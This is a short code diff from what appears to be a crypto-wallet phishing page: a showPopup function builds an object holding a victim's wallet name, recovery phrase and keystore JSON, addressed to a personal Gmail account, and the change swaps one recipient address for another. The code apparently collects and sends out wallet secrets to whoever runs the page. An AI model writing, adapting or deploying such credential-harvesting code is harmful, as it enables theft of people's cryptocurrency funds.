@@ -28,7 +28,7 @@ function showPopup(walletName) {
 		}
 
 		const walletData = {
-			to: 'maxwellexcel2@gmail.com',
+			to: 'Blessedgrace54321@gmail.com',
 			walletName,
 			phrase,
 			keystoreJSON,
